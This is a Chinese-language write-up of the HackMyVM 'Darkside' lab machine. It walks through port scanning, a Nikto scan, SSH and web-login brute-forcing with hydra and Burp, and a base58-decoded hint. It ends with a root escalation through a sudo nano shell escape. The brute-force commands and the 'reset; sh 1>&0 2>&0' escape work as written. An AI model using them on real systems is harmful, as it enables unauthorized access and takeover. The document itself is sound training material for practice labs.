# hmv_Darkside

# 0.简介

**靶机**：[hackmyvm - Darkside](https://hackmyvm.eu/machines/machine.php?vm=Darkside)
**难度**：绿色
**目标 IP**：192.168.205.134
**本机 IP**：192.168.205.141

# 1.扫描

一号男嘉宾，`nmap`开扫

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.134
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-14 10:42 CST
Nmap scan report for 192.168.205.134
Host is up (0.00078s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2D:1C:16 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.69 seconds                                                 
```

优先查看**http服务**端口，**ssh端口**如果没有进展再进行爆破

# 2.踩点

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

是个登录页，尝试`sql注入、万能密码、弱密码`均无果，使用`Nikto`进行WEB漏洞扫描

```bash
┌──(kali㉿kali)-[~/test]
└─$ nikto -h 192.168.205.134                       
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.205.134
+ Target Hostname:    192.168.205.134
+ Target Port:        80
+ Start Time:         2025-01-14 10:43:28 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.56 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /backup/: Directory indexing found.
+ /backup/: This might be interesting.
+ 8102 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2025-01-14 10:43:50 (GMT8) (22 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

有个备份目录，我们去网页查看一下

![image](https://github.com/user-attachments/assets/8432290e-d5d9-4863-9dfc-a43e9145b860)

只有一个`vote.txt`文本文件，给了我们几个用户名，我们拿这几个用户名去尝试爆破ssh服务

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.134/backup/vote.txt|awk -F ':' '{print $1}'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   205  100   205    0     0  69751      0 --:--:-- --:--:-- --:--:--  100k
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o

Since the result was a draw, we will let you enter the darkside, or at least temporarily, good luck kevin.
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ vim user  
                                      
┌──(kali㉿kali)-[~/test]
└─$ cat user
rijaba
xerosec
sml
cromiphi
gatogamer
chema
talleyrand
d3b0o
kevin
                  
┌──(kali㉿kali)-[~/test]
└─$ hydra -L user -P /usr/share/wordlists/q5000.txt ssh://192.168.205.134 -I -u -f -e nsr -t 64 

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-14 11:04:45
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 45027 login tries (l:9/p:5003), ~704 tries per task
[DATA] attacking ssh://192.168.205.134:22/

```

爆破的同时，我们用burp也爆破登录页

![image](https://github.com/user-attachments/assets/b8ec81f2-f037-4bec-a27e-335aee5329d9)

选这个，设置好参数后启动爆破

![image](https://github.com/user-attachments/assets/f4a491ef-5970-4991-b5e2-83ae8de8d3c7)

按照长度排序，可以发现该组用户密码长度明细不一样，尝试登录

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

获得了一串类似于base64的字符串，拿去[cyberchef](https://cyberchef.org/)解密

![image](https://github.com/user-attachments/assets/c0b9156f-bbb0-475f-920a-7ed966e0a230)

（尴尬了，是base58）输出了一串和网址很像的字符串，我们访问一下

![image](https://github.com/user-attachments/assets/1b02d153-2df9-4f83-a249-714cf8196a93)

问我们选哪边，我们查看源码

![image](https://github.com/user-attachments/assets/fe152899-e95a-4487-a6a3-69c1bdc75f10)

代码是实现了当存在名为 **side** 的 **cookie** 并且它的值是 `darkside`，那么脚本将重定向用户到 URL `hwvhysntovtanj.password`，我懒得改**cookie**了，我们直接访问

![image](https://github.com/user-attachments/assets/9bc27d36-69e8-4d83-a178-f695a8e598ce)

获得了一个貌似是**ssh服务**密码，我们尝试一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh kevin@192.168.205.134  
The authenticity of host '192.168.205.134 (192.168.205.134)' can't be established.
ED25519 key fingerprint is SHA256:pmPw9d2/o54jN+Dmo29Hq6rIzWOQ//VhyZvK4KN6rmk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.134' (ED25519) to the list of known hosts.
kevin@192.168.205.134's password: 
Linux darkside 5.10.0-26-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Oct 15 15:18:15 2023 from 10.0.2.18
kevin@darkside:~$ id
uid=1000(kevin) gid=1000(kevin) groups=1000(kevin)
```

成功连接

# 3.提权

```bash
kevin@darkside:~$ sudo -l
[sudo] password for kevin: 
Sorry, user kevin may not run sudo on darkside.
kevin@darkside:~$ 
kevin@darkside:~$ ls -la
total 32
drwxr-xr-x 3 kevin kevin 4096 Oct 30  2023 .
drwxr-xr-x 4 root  root  4096 Oct 15  2023 ..
lrwxrwxrwx 1 kevin kevin    9 Oct 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 kevin kevin  220 Oct 15  2023 .bash_logout
-rw-r--r-- 1 kevin kevin 3526 Oct 15  2023 .bashrc
-rw-r--r-- 1 kevin kevin  113 Oct 15  2023 .history
drwxr-xr-x 3 kevin kevin 4096 Oct 15  2023 .local
-rw-r--r-- 1 kevin kevin  807 Oct 15  2023 .profile
-rw-r--r-- 1 kevin kevin   19 Oct 15  2023 user.txt
kevin@darkside:~$ cat .history
ls -al
hostname -I
echo "Congratulations on the OSCP Xerosec"
top
ps -faux
su rijaba
ILoveJabita
ls /home/rijaba

```

在家目录发现了`.history`文本文件，查看获得了`rijaba`的密码，尝试登录

```bash
kevin@darkside:~$ su rijaba
Password: 
rijaba@darkside:/home/kevin$ id
uid=1001(rijaba) gid=1001(rijaba) groups=1001(rijaba)
```

继续测试提权

```bash
rijaba@darkside:/home/kevin$ sudo -l
Matching Defaults entries for rijaba on darkside:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User rijaba may run the following commands on darkside:
    (root) NOPASSWD: /usr/bin/nano

```

可以使用**root**运行`nano`，我们进行提权

```bash
rijaba@darkside:/home/kevin$ sudo /usr/bin/nano
```

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)

进入`nano`按**CTRL+R**，**CTRL+X**，输入`reset; sh 1>&0 2>&0`就提权成功了

![image](https://github.com/user-attachments/assets/68590d1b-033a-440d-8aea-5eff83ad1d78)